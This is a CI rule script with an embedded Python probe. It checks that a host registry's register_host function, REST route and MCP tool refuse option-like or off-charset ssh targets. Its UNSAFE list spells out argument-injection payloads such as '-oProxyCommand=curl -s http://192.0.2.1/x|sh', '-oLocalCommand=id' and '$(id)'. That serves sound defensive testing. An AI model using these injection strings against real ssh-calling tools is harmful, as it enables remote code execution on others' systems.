#!/usr/bin/env bash
# rule: HPF-001
# pipeline: hermes-pr-feedback-ci
# feedback: hermes-agent#143393/review-5631127162/1a
# source: https://github.com/NousResearch/hermes-agent/pull/143393#pullrequestreview-5631127162
# enforces: register_host - the function and the MCP tool and REST route on top of it - refuses
#   every ssh_target that starts with '-' or leaves the ssh-alias / [user@]host[:port] charset,
#   stores nothing for it, and still accepts aliases, user@host and host:port.
#
# usage: HPF-001-ssh-target-charset.sh <tree>    exit 0 pass, 1 violation, 2 cannot evaluate
# The probe imports s2docs from <tree>/src and drives a throwaway database; its target corpus is its
# own (it does not reuse the test suite's), so deleting a test cannot quietly weaken this rule.
set -euo pipefail
# shellcheck source=scripts/ci/lib.sh
. "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/lib.sh"
ci_begin HPF-001 "$@"
ci_need_file "$TREE/src/s2docs/hosts.py"

ci_py - <<'PY'
import logging
import os
import tempfile
from pathlib import Path

from cilib import import_from_tree, run_check

# Each would be read by ssh/scp as an option, or is outside the [user@]host[:port] charset.
UNSAFE = [
    "-oProxyCommand=touch /tmp/hpf-001",  # the reviewer's example
    "-oProxyCommand=curl -s http://192.0.2.1/x|sh",
    "-F/dev/null",
    "-oLocalCommand=id",
    "-",
    "-x",
    "--",
    "-host",
    "-user@host",
    "user@-oProxyCommand=id",
    "host -oProxyCommand=id",
    "host\n-oProxyCommand=id",
    "host\r",
    "host\t",
    " host",
    "host;id",
    "host|id",
    "host&id",
    "$(id)",
    "`id`",
    "ho'st",
    'ho"st',
    "ho\\st",
    "host/../x",
    "h\u00f6st",
    "host\x00",
    "user@[::1]",
    "ssh://host",
    "host:22:22",
    "host:0",
    "host:99999",
    "host:",
    "host:x",
    ":22",
    "@host",
    "user@",
    "a@b@c",
    "",
    "h" * 400,
]
SAFE = ["rtx-pc", "build-pc", "x", "Desktop2", "host.lan", "pompa@192.0.2.172", "svc_ci@host-01.example.com",
        "pompa@build-pc:2222", "192.0.2.10:22"]


def check():
    logging.disable(logging.INFO)  # the HTTP and MCP layers log every request; the verdict is enough
    work = Path(tempfile.mkdtemp(prefix="hpf-001-"))
    os.environ["S2DOCS_DATA_DIR"] = str(work / "data")  # before s2docs reads its settings
    hosts = import_from_tree("s2docs.hosts")
    Database = import_from_tree("s2docs.db.connection").Database
    create_app = import_from_tree("s2docs.api.app").create_app
    create_mcp_server = import_from_tree("s2docs.mcp_server").create_mcp_server
    import anyio
    from fastapi.testclient import TestClient
    from mcp import Client

    db = Database(work / "probe.db")
    with db.writer():
        pass
    violations = []

    def stored():
        return [h.ssh_target for h in hosts.list_hosts(db)]

    def forget():
        with db.writer() as conn, conn:
            conn.execute("DELETE FROM hosts")

    for target in UNSAFE:
        try:
            hosts.register_host(db, "probe-host", target)
        except hosts.HostError:
            pass
        else:
            violations.append(f"register_host accepted ssh_target {target!r}")
        if stored():
            violations.append(f"register_host stored {stored()!r} for the unsafe target {target!r}")
            forget()

    for target in SAFE:
        try:
            got = hosts.register_host(db, "probe-host", target).ssh_target
        except hosts.HostError as exc:
            violations.append(f"register_host refused the valid ssh_target {target!r}: {exc}")
            continue
        if got != target:
            violations.append(f"register_host stored {got!r} for {target!r}")
        forget()

    reviewer = UNSAFE[0]
    with TestClient(create_app(db.path)) as client:
        response = client.put("/api/hosts/probe-host", json={"ssh_target": reviewer})
    if response.status_code < 400:
        violations.append(f"PUT /api/hosts/probe-host accepted ssh_target {reviewer!r} (HTTP {response.status_code})")

    async def via_mcp():
        async with Client(create_mcp_server(db)) as client:
            return await client.call_tool("register_host", {"host_id": "probe-host", "ssh_target": reviewer})

    if not anyio.run(via_mcp).is_error:
        violations.append(f"the register_host MCP tool accepted ssh_target {reviewer!r}")
    if stored():
        violations.append(f"an unsafe target reached the registry through REST/MCP: {stored()!r}")
    return violations


run_check(check, ok="register_host (function, REST, MCP) refuses option-like and off-charset ssh targets")
PY
